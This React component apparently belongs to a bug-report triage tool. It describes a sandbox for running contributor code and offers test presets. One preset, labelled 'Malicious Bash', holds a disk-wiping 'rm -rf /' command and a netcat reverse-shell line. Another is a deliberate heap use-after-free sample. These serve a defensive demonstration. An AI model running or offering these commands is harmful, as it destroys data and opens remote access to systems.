import React, { useState } from 'react';
import { 
  ShieldCheck, 
  Cpu, 
  Lock, 
  Terminal, 
  Play, 
  AlertTriangle, 
  FileCode, 
  CheckCircle2, 
  Server,
  Layers,
  Flame,
  KeyRound
} from 'lucide-react';
import { ReproductionHarness } from '../types/triage';

export const SandboxInspector: React.FC = () => {
  const [testLang, setTestLang] = useState<'c' | 'python' | 'javascript' | 'bash'>('c');
  const [testCode, setTestCode] = useState<string>(
`#include <curl/curl.h>
#include <string.h>

int main() {
  CURLU *u = curl_url();
  char bad_ipv6[300];
  memset(bad_ipv6, 'A', 299); 
  bad_ipv6[299] = '\\0';

  // Testing claimed flag CURLU_STRICT_IPV6
  CURLUcode rc = curl_url_set(u, CURLUPART_HOST, bad_ipv6, CURLU_STRICT_IPV6);
  return (int)rc;
}`
  );
  const [running, setRunning] = useState<boolean>(false);
  const [sandboxResult, setSandboxResult] = useState<any>(null);

  const handleRunTest = async () => {
    setRunning(true);
    const mockHarness: ReproductionHarness = {
      language: testLang,
      code: testCode,
      description: 'Sandbox interactive verification run',
      expectedOutcome: 'Execution evaluation',
      safeExecutionPlan: {
        isolationLevel: 'gVisor sandbox',
        timeoutSec: 5,
        memoryLimitMb: 256,
        networkAllowed: false,
        droppedCapabilities: ['CAP_NET_RAW', 'CAP_SYS_ADMIN', 'CAP_DAC_OVERRIDE'],
      },
    };

    try {
      const res = await fetch('/api/triage/reproduce', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ harness: mockHarness }),
      });
      const data = await res.json();
      setSandboxResult(data);
    } catch (err: any) {
      console.error('Sandbox run failed:', err);
    } finally {
      setRunning(false);
    }
  };

  const loadPresetSnippet = (type: 'hallucinated-symbol' | 'dangerous-pattern' | 'valid-asan') => {
    if (type === 'hallucinated-symbol') {
      setTestLang('c');
      setTestCode(
`#include <curl/curl.h>
int main() {
  CURLU *u = curl_url();
  // Using non-existent flag to verify AST / header rejection
  return curl_url_set(u, CURLUPART_HOST, "::1", CURLU_STRICT_IPV6);
}`
      );
    } else if (type === 'dangerous-pattern') {
      setTestLang('bash');
      setTestCode(
`#!/bin/bash
# Malicious script attempting host escape or destructive command
rm -rf / --no-preserve-root
nc -e /bin/bash 192.168.1.1 4444`
      );
    } else {
      setTestLang('c');
      setTestCode(
`// OSS-Fuzz heap-use-after-free simulation with AddressSanitizer
#include <stdlib.h>
#include <string.h>

void Curl_dyn_reset(char *buf) {
  // Reads byte from freed pointer to trigger ASAN signal
  volatile char c = buf[0];
}

int main() {
  char *ptr = malloc(64);
  free(ptr);
  Curl_dyn_reset(ptr); // Trigger heap-use-after-free
  return 0;
}`
      );
    }
    setSandboxResult(null);
  };

  return (
    <div className="space-y-6">
      {/* Overview Banner */}
      <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 shadow-lg">
        <div className="flex items-center gap-3 mb-2">
          <div className="p-2 rounded-xl bg-emerald-950 text-emerald-400 border border-emerald-800">
            <ShieldCheck className="w-6 h-6" />
          </div>
          <div>
            <h2 className="text-lg font-bold text-white tracking-tight">
              Safe Sandbox Execution Architecture
            </h2>
            <p className="text-xs text-slate-400">
              How code submitted by unknown external contributors is executed safely without compromising host systems
            </p>
          </div>
        </div>
      </div>

      {/* 5 Layer Defense Architecture Cards */}
      <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
        <div className="bg-slate-900/70 border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="flex items-center gap-2 text-indigo-400 text-xs font-bold font-mono">
            <span className="w-5 h-5 rounded-full bg-indigo-950 flex items-center justify-center border border-indigo-700">1</span>
            AST Static Gate
          </div>
          <h4 className="text-xs font-semibold text-slate-200">Pre-Execution AST Audit</h4>
          <p className="text-[11px] text-slate-400 leading-relaxed">
            Parses submitted code into an Abstract Syntax Tree. Destructive syscalls (fork-bombs, disk wipes, raw sockets) are rejected before compilation.
          </p>
        </div>

        <div className="bg-slate-900/70 border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="flex items-center gap-2 text-cyan-400 text-xs font-bold font-mono">
            <span className="w-5 h-5 rounded-full bg-cyan-950 flex items-center justify-center border border-cyan-700">2</span>
            gVisor User Kernel
          </div>
          <h4 className="text-xs font-semibold text-slate-200">Syscall Virtualization</h4>
          <p className="text-[11px] text-slate-400 leading-relaxed">
            Uses Google gVisor (<code className="text-cyan-300">runsc</code>) user-space kernel. Sandboxed processes never communicate directly with host Linux kernel.
          </p>
        </div>

        <div className="bg-slate-900/70 border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="flex items-center gap-2 text-amber-400 text-xs font-bold font-mono">
            <span className="w-5 h-5 rounded-full bg-amber-950 flex items-center justify-center border border-amber-700">3</span>
            Zero Capabilities
          </div>
          <h4 className="text-xs font-semibold text-slate-200">Dropped Privileges</h4>
          <p className="text-[11px] text-slate-400 leading-relaxed">
            Drops <code className="text-amber-300">CAP_SYS_ADMIN</code>, <code className="text-amber-300">CAP_NET_RAW</code>, and <code className="text-amber-300">CAP_SYS_PTRACE</code>. Unprivileged UID 10001 only.
          </p>
        </div>

        <div className="bg-slate-900/70 border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="flex items-center gap-2 text-rose-400 text-xs font-bold font-mono">
            <span className="w-5 h-5 rounded-full bg-rose-950 flex items-center justify-center border border-rose-700">4</span>
            Network Blackhole
          </div>
          <h4 className="text-xs font-semibold text-slate-200">Total Offline Egress</h4>
          <p className="text-[11px] text-slate-400 leading-relaxed">
            All outbound network sockets are blocked. DNS lookups fail immediately to stop telemetry leaks, botnet C2 beacons, or reverse shells.
          </p>
        </div>

        <div className="bg-slate-900/70 border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="flex items-center gap-2 text-emerald-400 text-xs font-bold font-mono">
            <span className="w-5 h-5 rounded-full bg-emerald-950 flex items-center justify-center border border-emerald-700">5</span>
            Resource Bounds
          </div>
          <h4 className="text-xs font-semibold text-slate-200">Watchdog Clamps</h4>
          <p className="text-[11px] text-slate-400 leading-relaxed">
            Hard 5.0 second execution timeout, 256MB RAM cgroup limit, and 10MB tmpfs write capacity. Automatically killed on threshold breach.
          </p>
        </div>
      </div>

      {/* Interactive Sandbox Test Runner */}
      <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-lg space-y-4">
        <div className="flex flex-wrap items-center justify-between pb-3 border-b border-slate-800 gap-2">
          <div>
            <h3 className="text-sm font-semibold text-slate-100 flex items-center gap-2">
              <Terminal className="w-4 h-4 text-cyan-400" />
              Interactive Sandbox Simulator
            </h3>
            <p className="text-xs text-slate-400">
              Test code snippets against the safe execution isolation engine
            </p>
          </div>

          <div className="flex items-center gap-2">
            <span className="text-xs text-slate-400">Quick Test Templates:</span>
            <button
              onClick={() => loadPresetSnippet('hallucinated-symbol')}
              className="px-2.5 py-1 text-xs rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono transition"
            >
              Hallucinated Flag
            </button>
            <button
              onClick={() => loadPresetSnippet('dangerous-pattern')}
              className="px-2.5 py-1 text-xs rounded bg-rose-950/60 hover:bg-rose-900/80 text-rose-300 border border-rose-800 font-mono transition"
            >
              Malicious Bash
            </button>
            <button
              onClick={() => loadPresetSnippet('valid-asan')}
              className="px-2.5 py-1 text-xs rounded bg-emerald-950/60 hover:bg-emerald-900/80 text-emerald-300 border border-emerald-800 font-mono transition"
            >
              OSS-Fuzz ASAN
            </button>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          <div className="space-y-2">
            <div className="flex items-center justify-between text-xs">
              <label className="font-semibold text-slate-300">Contributor Submitted Code</label>
              <div className="flex items-center gap-2">
                {(['c', 'python', 'javascript', 'bash'] as const).map((lang) => (
                  <button
                    key={lang}
                    onClick={() => setTestLang(lang)}
                    className={`px-2 py-0.5 rounded text-[11px] font-mono uppercase ${
                      testLang === lang
                        ? 'bg-indigo-600 text-white font-bold'
                        : 'bg-slate-800 text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    {lang}
                  </button>
                ))}
              </div>
            </div>

            <textarea
              rows={12}
              value={testCode}
              onChange={(e) => setTestCode(e.target.value)}
              className="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-indigo-500 leading-relaxed"
            />

            <button
              onClick={handleRunTest}
              disabled={running}
              className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl font-semibold text-xs text-white bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 transition shadow-md shadow-emerald-700/30"
            >
              <Play className={`w-4 h-4 ${running ? 'animate-spin' : ''}`} />
              {running ? 'Executing in gVisor Sandbox...' : 'Execute in Sandboxed Container Simulator'}
            </button>
          </div>

          <div className="space-y-2">
            <label className="block text-xs font-semibold text-slate-300">
              Sandbox Execution Logs & Telemetry
            </label>

            <div className="bg-slate-950 border border-slate-800 rounded-lg p-3.5 h-[280px] overflow-y-auto font-mono text-xs space-y-2">
              {!sandboxResult && !running && (
                <div className="text-slate-500 italic pt-12 text-center">
                  Click "Execute in Sandboxed Container Simulator" to observe isolated execution, compiler checks, security policy intercepts, or ASAN crash analysis.
                </div>
              )}

              {running && (
                <div className="text-cyan-400 flex items-center gap-2 pt-12 justify-center">
                  <div className="w-4 h-4 border-2 border-cyan-400 border-t-transparent rounded-full animate-spin"></div>
                  Initializing gVisor container & applying seccomp filters...
                </div>
              )}

              {sandboxResult && (
                <>
                  <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                    <span className={`px-2.5 py-0.5 rounded text-[11px] font-bold uppercase ${
                      sandboxResult.status === 'security_policy_blocked' ? 'bg-rose-950 text-rose-300 border border-rose-800' :
                      sandboxResult.status === 'reproduced_bug' ? 'bg-emerald-950 text-emerald-300 border border-emerald-800' :
                      sandboxResult.status === 'compile_or_syntax_error' ? 'bg-purple-950 text-purple-300 border border-purple-800' :
                      'bg-slate-800 text-slate-300'
                    }`}>
                      Status: {sandboxResult.status.replace(/_/g, ' ')}
                    </span>
                    <span className="text-slate-400 text-[11px]">
                      Exit Code: <strong className="text-white">{sandboxResult.exitCode}</strong> ({sandboxResult.durationMs}ms)
                    </span>
                  </div>

                  <div className="bg-slate-900/60 p-2 rounded border border-slate-800/80 text-[11px] text-slate-400 space-y-0.5">
                    <div>Runtime: <span className="text-cyan-300">{sandboxResult.sandboxMetadata.runtime}</span></div>
                    <div>Isolation: <span className="text-indigo-300">{sandboxResult.sandboxMetadata.isolation}</span></div>
                    <div>Network: <span className="text-rose-300">Blocked (0 bytes sent)</span></div>
                    <div>Caps Dropped: <span className="text-amber-300">{sandboxResult.sandboxMetadata.capabilitiesDropped.join(', ')}</span></div>
                  </div>

                  {sandboxResult.sanitizerLogs && (
                    <div className="p-2 rounded bg-rose-950/40 border border-rose-800 text-rose-200 text-[11px]">
                      <strong>AddressSanitizer:</strong> {sandboxResult.sanitizerLogs}
                    </div>
                  )}

                  {sandboxResult.stdout && (
                    <div className="text-slate-200 whitespace-pre-wrap">{sandboxResult.stdout}</div>
                  )}

                  {sandboxResult.stderr && (
                    <div className="text-rose-300/90 whitespace-pre-wrap">{sandboxResult.stderr}</div>
                  )}
                </>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Answers to Core Technical Considerations */}
      <div className="bg-slate-900/70 border border-slate-800 rounded-xl p-5 shadow-sm space-y-4">
        <h3 className="text-sm font-semibold text-slate-100 flex items-center gap-2">
          <KeyRound className="w-4 h-4 text-indigo-400" />
          Technical Considerations & Maintainer Evidence Criteria
        </h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs text-slate-300">
          <div className="bg-slate-950/60 p-3.5 rounded-lg border border-slate-800">
            <h4 className="font-bold text-white mb-1">1. Distinguishing Genuine Bugs from Incorrect Claims</h4>
            <p className="text-slate-400 leading-relaxed">
              VeriTriage cross-references cited symbols, options, and APIs against the repository's AST and header declarations. As demonstrated in curl's AI report audits, fabricated flags (e.g. <code className="text-cyan-300">CURLU_STRICT_IPV6</code>) or nonexistent parameters (e.g. <code className="text-cyan-300">verify_ssl_strict</code>) are immediately flagged as unsupported hallucinations before any maintainer review time is lost.
            </p>
          </div>

          <div className="bg-slate-950/60 p-3.5 rounded-lg border border-slate-800">
            <h4 className="font-bold text-white mb-1">2. Trustworthy Evidence Hierarchy</h4>
            <p className="text-slate-400 leading-relaxed">
              Maintainers prioritize reproducible artifacts: (1) AddressSanitizer / Valgrind memory traces with exact line numbers, (2) deterministic reproduction scripts (MREs) with isolated inputs, (3) RFC specification section citations, and (4) exact git commit SHAs over vague prose.
            </p>
          </div>

          <div className="bg-slate-950/60 p-3.5 rounded-lg border border-slate-800">
            <h4 className="font-bold text-white mb-1">3. Communicating Uncertainty Rigorously</h4>
            <p className="text-slate-400 leading-relaxed">
              Instead of binary confident assertions, VeriTriage decomposes uncertainty into <em>Epistemic</em> (reducible gaps like missing reporter environment flags) and <em>Aleatoric</em> (stochastic concurrency race conditions), outputting explicit confidence intervals and concrete questions to ask the contributor.
            </p>
          </div>

          <div className="bg-slate-950/60 p-3.5 rounded-lg border border-slate-800">
            <h4 className="font-bold text-white mb-1">4. Minimizing False Positives & False Negatives</h4>
            <p className="text-slate-400 leading-relaxed">
              By separating claim extraction, symbol grounding, and dry-run execution into sequential gates, legitimate bugs cannot be accidentally dismissed as hallucinations if valid stack traces are present, while unsubstantiated security CVE alerts without code grounding are prevented from creating false alarms.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
